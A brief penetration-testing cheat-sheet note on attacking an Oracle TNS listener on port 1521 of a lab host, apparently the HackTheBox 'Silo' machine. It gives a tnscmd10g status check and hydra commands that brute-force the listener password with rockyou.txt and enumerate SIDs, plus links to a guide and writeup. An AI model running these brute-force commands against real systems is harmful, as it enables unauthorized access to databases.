**Port 1521**

Command to try
```
tnscmd10g status -h 10.10.10.82
```
if you didn't get Any error, the fine. If it shows Error then you have to use hydra to get passwords or SID's

Commands to do so
```
hydra -P /usr/share/wordlists/rockyou.txt -t 32 -s 1521 10.10.10.82 oracle-listener
```
```
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid -t 64 -I
```

Then Follow the Instructions on the links 
https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573
https://medium.com/@v1per/silo-hackthebox-writeup-cec449e0a4bc
